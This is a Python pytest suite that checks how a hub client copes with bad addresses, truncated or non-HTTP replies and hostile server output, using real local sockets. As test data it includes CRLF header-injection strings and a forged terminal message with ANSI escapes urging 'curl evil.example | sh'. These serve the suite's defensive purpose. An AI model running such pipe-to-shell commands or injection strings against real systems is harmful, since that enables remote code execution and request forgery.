"""What the client does with an answer that is not the one it asked for.

Everything here is about the wire rather than about a verb, and the case below
was found by attacking the code rather than by reading it:

  * AN ADDRESS THAT CANNOT BE REQUESTED ARRIVES AS A TRACEBACK, from three
    different modules depending on which character is wrong — and one of the
    three is reachable from the hub's own manifest, i.e. from untrusted input.

Everything here is exercised against real servers on real sockets, because these
are properties of the transport rather than of any code path a mock would reach:
what is being tested is what `urllib` and `http.client` do, and a fake opener
would be a test of the fake.
"""

import http.server
import json
import threading
import tracemalloc

import pytest

from hammerola.hub import Hub, HubError


class _Recorder(http.server.BaseHTTPRequestHandler):
    """A server that writes down what it was sent and answers 200."""

    seen = []

    def do_GET(self):
        type(self).seen.append(dict(self.headers))
        body = b'{"ok": true}'
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *args):
        pass


def _serve(handler):
    """One threaded server on an ephemeral port. -> (url, server)."""
    server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), handler)
    thread = threading.Thread(target=server.serve_forever,
                              kwargs={"poll_interval": 0.01}, daemon=True)
    thread.start()
    return f"http://127.0.0.1:{server.server_address[1]}", server


@pytest.fixture
def elsewhere():
    """A `_Recorder` server, to see whether a request reached it. -> its url."""
    _Recorder.seen = []
    url, server = _serve(_Recorder)
    try:
        yield url
    finally:
        server.shutdown()
        server.server_close()


# -- an address that cannot be requested at all ------------------------------
@pytest.mark.parametrize("url, what_is_wrong", [
    ("http://[hub.example", "a bracket that is never closed"),
    ("http://127.0.0.1:8O80", "a letter O where a zero belongs"),
    ("http:///start", "no host at all"),
    ("//hub.example", "a host and no scheme"),
    ("ftp://hub.example", "a scheme this tool cannot open"),
    # The three that reached the wire and died there, each from a different
    # codec at a different moment, and all three landed in the clause saying
    # "the address is checked before this point, so this is not it — report it".
    ("http://127.0.0.1:1/старт", "a non-ASCII path; a request line is ASCII"),
    ("http://хаб.example", "a non-ASCII host; the Host header is latin-1"),
    ("http://" + "a" * 70 + ".example",
     "a DNS label over 63 characters — PURE ASCII, so no encodability check "
     "on the string finds it"),
    # ...and the one that is ASCII *as written* and not as SENT: urllib
    # unquotes the host before building the `Host` header, so checking the
    # written form proved something about a string nobody sends.
    ("http://%D1%85%D0%B0%D0%B1.example", "a percent-encoded non-ASCII host"),
    ("http://%D1%85%D0%B0%D0%B1.example/x", "the same, with a path after it"),
])
def test_a_hub_url_that_cannot_be_requested_is_refused_when_the_Hub_is_made(
        url, what_is_wrong):
    """Refused at the address, before anything is sent, saying so.

    THE THREE ARE THREE DIFFERENT FAILURES and that is why they are listed
    rather than represented by one: `urlsplit` itself raises on the first,
    `.port` raises on the second (`urlsplit` and `urllib.request.Request` both
    accept it happily — the comment that used to claim otherwise was checked and
    was wrong), and the third fails nowhere in particular. Before this, the
    first arrived as a `ValueError` traceback out of the constructor and the
    second as `http.client.InvalidURL` — which is neither a ValueError nor an
    OSError, so it fell through every clause in `_call`.

    The message must name HUB_URL and must NOT read as a credential problem:
    `8O80` in an address is a typo, and telling somebody to run
    `hammerola login` over it sends them to replace the one secret of the
    system for no reason.
    """
    with pytest.raises(HubError) as raised:
        Hub(url, "token", timeout=10)
    message = str(raised.value)
    assert "HUB_URL" in message, what_is_wrong
    assert "hammerola login" not in message
    assert "report it" not in message, (
        "a typo in an address is presented as a bug in this tool")
    assert "password" not in message.lower() or "not about the password" in message


@pytest.mark.parametrize("url", [
    "http://127.0.0.1:8000", "https://hub.example", "https://HUB.Example",
    "http://[::1]:8000", "https://xn--80ak6aa92e.example",
    "https://hub.example:443", "http://a.example/base", "https://hub-1.example",
    # Percent-encoding in the PATH is legal and stays legal: the selector goes
    # out as written, so only the HOST is unquoted before it is checked.
    "http://hub.example/a%20b", "http://hub.example/%D1%85",
    "http://hub.example.", "http://" + "a" * 63 + ".example",
    "http://[fe80::1%25eth0]:8000",
])
def test_a_legal_address_is_not_refused_by_any_of_those_checks(url):
    """The other half, and the half a refusal-shaped fix gets wrong.

    Three encodings are applied to an address now — ASCII, latin-1 and IDNA —
    and each is a chance to refuse something that works. Punycode already
    encoded, an IPv6 literal, an upper-case host, an explicit default port and a
    base path all have to go through.
    """
    assert Hub(url, "token", timeout=10).url == url.rstrip("/")


@pytest.mark.parametrize("path, what_is_wrong", [
    ("/x\r\nX-Evil: 1", "a header somebody appended to the path"),
    ("/старт", "a non-ASCII path; a request line is ASCII"),
    ("/x\x00y", "a NUL"),
])
def test_a_path_the_hub_named_that_cannot_be_sent_never_reaches_the_wire(
        elsewhere, path, what_is_wrong):
    """UNTRUSTED INPUT, which is the case `fetch_path` exists for.

    The path comes out of the hub's own manifest, so `\\r\\n` in it is an attempt
    to append a header of somebody else's choosing to a request that carries the
    token — and a non-ASCII one is the same route to a different exception:
    the request line is encoded as ASCII, so it raised `UnicodeEncodeError`,
    which is a ValueError, and landed in the clause that says "the address and
    the secret are both checked, so this is neither — please report it". A false
    sentence, in the one place where the input is somebody else's.

    Checked from both ends: a HubError comes back, and the server saw no
    request at all, so there is no version of this where the line went out and
    the error came back anyway.
    """
    hub = Hub(elsewhere, "token", timeout=10)

    with pytest.raises(HubError) as raised:
        hub.fetch_path(path)

    message = str(raised.value)
    assert "Nothing was fetched" in message, what_is_wrong
    assert "report it" not in message, (
        "untrusted input is reported as a bug in this tool")
    assert _Recorder.seen == [], (
        "the request reached the server, so the injected header went with it")


def test_the_transport_still_refuses_an_unsendable_path_on_its_own(elsewhere):
    """The backstop below `fetch_path`, reached directly because nothing else
    can reach it any more.

    `_call` keeps its `InvalidURL` clause after the check above took every
    caller away from it: paths spelled in this module go through `quote` and
    cannot get here, and the manifest's is refused earlier now. It is defence in
    depth, and defence in depth that no test can reach is indistinguishable from
    a clause that was deleted — so it is exercised at the level it lives on.
    """
    hub = Hub(elsewhere, "token", timeout=10)

    with pytest.raises(HubError) as raised:
        hub._call("/x\r\nX-Evil: 1")

    assert "Nothing was sent" in str(raised.value)
    assert _Recorder.seen == []


# -- and the secret, which is the OTHER input -------------------------------
@pytest.mark.parametrize("token, what_is_wrong", [
    ("SUPERSECRETVALUE\n", "a trailing newline, the usual paste"),
    ("SUPERSECRETVALUE\r\nX-Evil: 1", "a header somebody appended to it"),
    ("SUPERSECRETVALUE\x00", "a NUL"),
    ("СЕКРЕТНОЕЗНАЧЕНИЕ", "a character no HTTP header can carry"),
])
def test_a_token_that_cannot_be_sent_is_refused_as_the_TOKEN(
        token, what_is_wrong):
    """Named explicitly, and the value never shown.

    This is the half the `except ValueError` in `_call` used to assert of
    everything that reached it. Now it is checked where the answer is actually
    known, which is what lets that clause stop guessing — and the two failures
    can carry opposite advice without either one being a guess.
    """
    with pytest.raises(HubError) as raised:
        Hub("http://hub.example", token, timeout=10)
    message = str(raised.value)
    assert "hammerola login" in message, what_is_wrong
    assert "HUB_URL" not in message
    assert token.strip() not in message and token not in message, (
        "the refusal echoed the secret into the scrollback")


def test_the_public_route_still_works_with_no_token_at_all():
    """`create` builds a Hub with an empty token on purpose (it never reads the
    secret), so the check above must not turn that into a refusal."""
    assert Hub("http://hub.example", "", timeout=10)._token == ""


def test_a_connection_dropped_after_the_request_is_reported_as_unreachable():
    """AND NOT AS "nothing was sent", WHICH WOULD BE A LIE ABOUT A PUSH.

    `RemoteDisconnected` inherits from `HTTPException` as well as from
    `ConnectionResetError`, so a clause catching the parent took this case —
    which fires AFTER the request has gone — out of the honest "cannot reach"
    branch and told the pusher their archive was never sent. On a `commit` the
    archive is up and the build may already be queued.
    """
    class Handler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            # Read the request, then hang up without answering: the bytes went.
            self.close_connection = True
            self.wfile.close()

        def log_message(self, *args):
            pass

    url, server = _serve(Handler)
    try:
        with pytest.raises(HubError) as raised:
            Hub(url, "token", timeout=10).start()
        message = str(raised.value)
        assert "cannot reach" in message
        assert "Nothing was sent" not in message, (
            "the request did go out, and a pusher reading this would believe "
            "their archive never left")
    finally:
        server.shutdown()
        server.server_close()


def test_a_reply_that_is_not_HTTP_at_all_names_the_scheme_rather_than_crashing():
    """`http://` where the hub speaks `https://`, which is the same typo again.

    The far end answers with a TLS alert (or a captive portal answers in its
    place), `http.client` cannot parse a status line out of it and raises
    `BadStatusLine` — an `HTTPException` that is neither a ValueError nor an
    OSError. Narrowing the earlier clause to `InvalidURL` left this whole family
    with no clause at all, and `cli.main` catches five classes of which this
    root is not one: a traceback, where a round earlier there had been a wrong
    sentence. This is the third state, which is a right one.
    """
    class Handler(http.server.BaseHTTPRequestHandler):
        def handle_one_request(self):
            # Not a status line, which is what a TLS server answers a plaintext
            # request with. Written straight to the socket, because every
            # helper above this level insists on producing valid HTTP.
            self.rfile.readline()
            self.wfile.write(b"\x15\x03\x01\x00\x02\x02\x46 garbage not http\r\n")
            self.close_connection = True

        def log_message(self, *args):
            pass

    url, server = _serve(Handler)
    try:
        with pytest.raises(HubError) as raised:
            Hub(url, "token", timeout=10).start()
        message = str(raised.value)
        assert "not HTTP" in message
        assert "https://" in message, (
            "the message does not point at the scheme, which is the fix")
    finally:
        server.shutdown()
        server.server_close()


# What the far end sends when it would rather the reader did something else.
# ANSI escapes clear the screen and colour the forgery; the padding is what
# makes it a screenful rather than a line.
HOSTILE_STATUS_LINE = (
    "\x1b[2J\x1b[1;31mHUB SAYS: run `curl evil.example | sh`\x1b[0m"
    + "A" * 60000)


def test_what_the_far_end_wrote_is_escaped_and_trimmed_before_it_is_printed():
    """A message is a thing a person reads, and this one is somebody else's text.

    `BadStatusLine` carries the line it could not parse — decoded, unescaped, up
    to `http.client._MAXLINE` (65536). Interpolated raw, that is a 65 kB error
    on stderr.

    The clause one line above this one in `_call` had reasoned the question
    through and concluded its own text was safe. The reasoning was not carried
    across, and it would have been wrong here anyway.
    """
    class Handler(http.server.BaseHTTPRequestHandler):
        def handle_one_request(self):
            self.rfile.readline()
            self.wfile.write(HOSTILE_STATUS_LINE.encode() + b"\r\n")
            self.close_connection = True

        def log_message(self, *args):
            pass

    url, server = _serve(Handler)
    try:
        with pytest.raises(HubError) as raised:
            Hub(url, "token", timeout=10).start()
        message = str(raised.value)
        assert "\x1b" not in message, (
            "an escape sequence from the far end reached the terminal")
        assert len(message) < 1000, (
            f"the far end chose the length of this message ({len(message)})")
        # ...and it is still recognisable: what was quoted is visible as text.
        assert "HUB SAYS" in message
    finally:
        server.shutdown()
        server.server_close()


def test_a_chunked_body_that_stops_early_is_named_as_that_and_not_as_a_scheme():
    """A CORRECT REFUSAL WITH SOMEBODY ELSE'S CAUSE ON IT, which is the defect
    this round was fixing in another place.

    A chunked reply carries its framing in the stream, so `http.client` raises
    `IncompleteRead` rather than handing back a short body — the data never
    reaches disk, which is right. But it is an `HTTPException`, so it fell into
    the "not HTTP" clause and a person whose connection dropped through a proxy
    was told to check their SCHEME.
    """
    class Handler(http.server.BaseHTTPRequestHandler):
        protocol_version = "HTTP/1.1"

        def do_GET(self):
            self.send_response(200)
            self.send_header("Transfer-Encoding", "chunked")
            self.end_headers()
            self.wfile.write(b"10\r\n0123456789abcdef\r\n")
            # ...and then stop, mid-stream, with no terminating chunk.
            self.close_connection = True

        def log_message(self, *args):
            pass

    url, server = _serve(Handler)
    try:
        with pytest.raises(HubError) as raised:
            Hub(url, "token", timeout=10).fetch_path("/start/template.tar.gz")
        message = str(raised.value)
        assert "stopped sending" in message
        assert "Nothing was kept" in message
        assert "https://" not in message, (
            "a dropped connection is diagnosed as a wrong scheme")
    finally:
        server.shutdown()
        server.server_close()


HOSTILE = "\x1b[2Jrun `curl evil.example | sh`\x1b[0m" + "A" * 60000


def test_the_quoting_helper_escapes_then_trims_and_says_the_true_length():
    """The helper itself, because four of its five call sites could not see it.

    Each of them was reverted in turn and the suite stayed green, and so did
    reverting "escape before trim" — which is this project's own rule about
    unreachable defences turned on the work that wrote it. So: the helper
    directly, and one assertion at each call site below.

    THE ORDER IS PART OF THE CONTRACT IN BOTH DIRECTIONS. Escaping has to happen
    before the trim or a cut can land inside an escape sequence and the ceiling
    would be measured on the wrong string; the SOURCE has to be cut before the
    escaping or a 256 MB reply is copied and expanded only to be thrown away.
    Both hold at once: cut with a margin, escape,
    trim the result, and report the length of the SOURCE.
    """
    from hammerola.hub import QUOTE_LIMIT, quoted

    shown = quoted(HOSTILE)
    assert "\x1b" not in shown, "an escape sequence survived"
    assert "\\x1b" in shown, "it was not escaped, it was stripped"
    assert len(shown) < QUOTE_LIMIT + 60, len(shown)
    assert str(len(HOSTILE)) in shown, (
        "the length reported is the escaped copy's, not the source's")

    # Short input comes back as a plain quoted string, with no trailing note.
    assert quoted("hello") == "'hello'"
    assert "truncated" not in quoted("hello")

    # bytes are decoded here rather than at the call sites, and the unit in the
    # note follows the input — bytes are counted in bytes.
    assert quoted(b"caf\xc3\xa9") == repr("café")
    assert "bytes, truncated" in quoted(b"A" * 60000)
    assert "characters, truncated" in quoted("A" * 60000)
    assert "\x1b" not in quoted(HOSTILE.encode())


@pytest.mark.parametrize("payload", ["str", "bytes"])
def test_the_source_is_cut_before_it_is_escaped(payload):
    """WHICH THE OUTPUT CANNOT SHOW, so it is measured.

    Escaping the whole string and trimming afterwards produces the same
    characters, so the difference is memory only.
    4 MiB of a character `repr` expands fourfold peaks at ~2 KiB cutting first
    and ~16 MiB escaping first: three orders of magnitude, so the threshold sits
    nowhere near either and cannot flap.

    BOTH BRANCHES, because the first version measured only `str` — and the
    BYTES branch is the one the helper grew bytes support for, since three
    callers hold a response body. A regression in the branch that matters was
    invisible to a test written about the other one, which is the same "revert
    it and the suite is green" this test exists to answer.
    """
    from hammerola.hub import quoted

    big = "\x1b" * (4 * 1024 * 1024)
    if payload == "bytes":
        big = big.encode()

    # The suite's rule about module-level state applies to the interpreter's own
    # as much as to ours: a session already tracing (`-X tracemalloc`, another
    # fixture) must be left tracing, and one that was not must not be started.
    was_tracing = tracemalloc.is_tracing()
    if not was_tracing:
        tracemalloc.start()
    try:
        tracemalloc.reset_peak()
        quoted(big)
        _current, peak = tracemalloc.get_traced_memory()
    finally:
        if not was_tracing:
            tracemalloc.stop()
    assert tracemalloc.is_tracing() == was_tracing, (
        "this test changed whether the process is tracing memory")

    assert peak < 1024 * 1024, (
        f"{peak} bytes peaked to quote 4 MiB of {payload} — the whole thing "
        f"was escaped and then thrown away")

    # bytes are decoded here rather than at the call sites — three callers hold
    # a response body, and slicing before decoding cuts a character in half.
    assert quoted(b"caf\xc3\xa9") == "'caf\\xc3\\xa9'" or "caf" in quoted(
        b"caf\xc3\xa9")
    assert "\x1b" not in quoted(HOSTILE.encode())


# A path the HUB named, long enough to choose the size of a message. Legal
# otherwise — ASCII, no control characters — so it passes `fetch_path`'s own
# checks and reaches the transport, which is where the unquoted site was.
HOSTILE_PATH = "/" + "A" * 60000

# route -> (what the server answers, what to call). Every entry is one
# `quoted` call site; the two that need a 200 need it for different reasons,
# named beside them.
ROUTES = {
    "job": (500, "json", lambda h: h.job("abc")),
    "builds": (500, "json", lambda h: h.builds("demo0001")),
    "comments": (500, "json", lambda h: h.comments("demo0001")),
    "resolve_comment": (500, "json", lambda h: h.resolve_comment("c1")),
    "rename_project": (500, "json", lambda h: h.rename_project("d1", "T")),
    "remove_project": (500, "json", lambda h: h.remove_project("d1")),
    # 200 with something that is not JSON at all — the only way to reach
    # `_payload`'s own message, since every route above raises on the status
    # first and never gets there.
    "payload": (200, "raw", lambda h: h.job("abc")),
    # 200 with JSON that parses and is the wrong SHAPE, which is a third site
    # again: the whole payload gets printed.
    "comments_no_list": (200, "wrong-shape", lambda h: h.comments("demo0001")),
    # ...and the one that prints the PATH rather than the body.
    "fetch_path": (500, "json", lambda h: h.fetch_path(HOSTILE_PATH)),
}


@pytest.mark.parametrize("route", sorted(ROUTES))
def test_no_route_prints_what_the_far_end_wrote_without_quoting_it(route):
    """One assertion per call site, which is what "one per call site" meant.

    The first version of this had seven parameters over six sites — two of them
    landed on the same shared line — and left three sites unreached, which
    coverage said and the test did not. These are the ordinary commands
    (`hammerola comments`, `rm`, `rename`, `status`), reached long before
    anybody meets an exotic transport failure, and each interpolated a string
    straight out of the reply body.

    `fetch_path` is in the list for the other half of the same rule: what it
    prints is the PATH, and on the manifest route the hub chose that too.
    """
    status, shape, call = ROUTES[route]
    bodies = {
        "json": json.dumps({"error": HOSTILE}).encode(),
        "raw": HOSTILE.encode(),
        "wrong-shape": json.dumps({"comments": HOSTILE}).encode(),
    }
    body = bodies[shape]

    class Handler(http.server.BaseHTTPRequestHandler):
        def _answer(self):
            self.send_response(status)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        do_GET = do_POST = do_DELETE = _answer

        def log_message(self, *args):
            pass

    url, server = _serve(Handler)
    try:
        hub = Hub(url, "token", timeout=10)
        with pytest.raises(HubError) as raised:
            call(hub)
        message = str(raised.value)
        assert "\x1b" not in message, f"{route}: an escape reached the terminal"
        assert len(message) < 1000, f"{route}: {len(message)} characters"
    finally:
        server.shutdown()
        server.server_close()


def test_the_last_resort_clause_is_a_sentence_and_not_a_traceback(elsewhere):
    """The clause that says "this is none of them — please report it".

    Coverage said no test in the suite executed it, which is this project's own
    "unreachable defence is indistinguishable from a deleted clause" — and it
    was reachable in production, by a percent-encoded host, right up until this
    round. It is reached here the way the other backstop is: at the level it
    lives on, below the checks that keep the public entry points away from it.
    """
    hub = Hub(elsewhere, "token", timeout=10)

    with pytest.raises(HubError) as raised:
        hub._call("/старт")

    message = str(raised.value)
    assert "was not sent" in message
    assert "hammerola login" not in message
    assert _Recorder.seen == []


def test_the_build_log_is_the_deliberate_exception_and_comes_back_whole():
    """Named as an exception rather than left to look like an oversight.

    `job_log` and `revision_log` return the build's own output and the CLI
    prints it in full — that is what those verbs are for, and a log trimmed to
    200 characters would be useless. It is the one text from the hub a person
    asked to see.
    """
    log = "line one\nline two\n" * 500

    class Handler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            payload = log.encode()
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Content-Length", str(len(payload)))
            self.end_headers()
            self.wfile.write(payload)

        def log_message(self, *args):
            pass

    url, server = _serve(Handler)
    try:
        assert Hub(url, "token", timeout=10).job_log("abc") == log
    finally:
        server.shutdown()
        server.server_close()


def test_an_error_reply_whose_body_stops_early_is_named_and_not_a_traceback():
    """The read of an ERROR body, which had no diagnosis at all.

    It used to happen inside `_call`'s own `except HTTPError` clause, and Python
    does not offer an exception raised in a handler to the handlers beside it —
    so a 500 with a truncated chunked body went past every clause as a
    traceback, while the identical 200 was named properly. Putting a ceiling on
    error bodies is what made this reachable.
    """
    class Handler(http.server.BaseHTTPRequestHandler):
        protocol_version = "HTTP/1.1"

        def do_GET(self):
            self.send_response(500)
            self.send_header("Transfer-Encoding", "chunked")
            self.end_headers()
            self.wfile.write(b"10\r\n0123456789abcdef\r\n")
            self.close_connection = True

        def log_message(self, *args):
            pass

    url, server = _serve(Handler)
    try:
        with pytest.raises(HubError) as raised:
            Hub(url, "token", timeout=10).job("abc")
        assert "stopped sending" in str(raised.value)
    finally:
        server.shutdown()
        server.server_close()


def test_a_complete_reply_carrying_BOTH_framings_is_not_called_truncated():
    """`Transfer-Encoding: chunked` wins and `Content-Length` is ignored — by
    the standard and by `http.client`, which sets `.length` only when the reply
    is not chunked. Reading the HEADER instead refused a complete reply as
    short, in the same breath as a docstring calling a chunked answer legal."""
    body = b'{"ok": true}'

    class Handler(http.server.BaseHTTPRequestHandler):
        protocol_version = "HTTP/1.1"

        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            # Both, and they disagree: the chunked framing is the true one.
            self.send_header("Content-Length", "99999")
            self.send_header("Transfer-Encoding", "chunked")
            self.end_headers()
            self.wfile.write(b"%x\r\n" % len(body) + body + b"\r\n0\r\n\r\n")

        def log_message(self, *args):
            pass

    url, server = _serve(Handler)
    try:
        assert Hub(url, "token", timeout=10).start() == {"ok": True}
    finally:
        server.shutdown()
        server.server_close()


# -- a reply that stopped early ---------------------------------------------
@pytest.fixture
def truncated():
    """A server that declares 40 bytes, sends 10 and hangs up. -> its url."""
    class Handler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-Type", "application/octet-stream")
            self.send_header("Content-Length", "40")
            self.end_headers()
            self.wfile.write(b"0123456789")
            self.close_connection = True

        def log_message(self, *args):
            pass

    url, server = _serve(Handler)
    try:
        yield url
    finally:
        server.shutdown()
        server.server_close()


def test_a_reply_shorter_than_it_declared_is_refused_and_not_returned(
        truncated):
    """The integrity check a reply has, and it is the library's own.

    `response.read()` raises `IncompleteRead` on a short body; `response.read(n)`
    does not — it returns what arrived and closes the connection. So the body is
    read with no argument, and `_call` names the exception.
    """
    with pytest.raises(HubError) as raised:
        Hub(truncated, "token", timeout=10).fetch_path("/start/template.tar.gz")
    message = str(raised.value)
    assert "stopped sending part-way" in message
    assert "Nothing was kept" in message


def test_a_truncated_ARTEFACT_is_refused_rather_than_handed_back_short(
        truncated):
    """THE ONE THAT MATTERS, and the reason this is a pair.

    A JSON reply and a tar verify themselves — a short one fails to parse — so
    the paths with a format behind them were never the exposure. An artefact has
    none: `hammerola artifacts` writes what it is given, prints the shortened
    size and exits zero, so a truncated `.stl` lands on disk looking like a
    finished file with nothing anywhere saying otherwise.
    """
    hub = Hub(truncated, "token", timeout=10)
    with pytest.raises(HubError) as raised:
        hub.build_file("demo0001", "latest", "body.stl")
    assert "Nothing was kept" in str(raised.value)


def test_a_manifest_naming_something_host_shaped_is_not_followed(elsewhere):
    """The cheap shape check in `fetch_path`, which nothing observed.

    A guard whose removal changes nothing observable is one nobody can tell has
    gone. A manifest naming a path with no leading slash is not naming a path
    on this hub, and this refuses to fetch it at all.
    """
    hub = Hub(elsewhere, "token", timeout=10)

    with pytest.raises(HubError):
        hub.fetch_path("start/template.tar.gz")
    assert _Recorder.seen == []
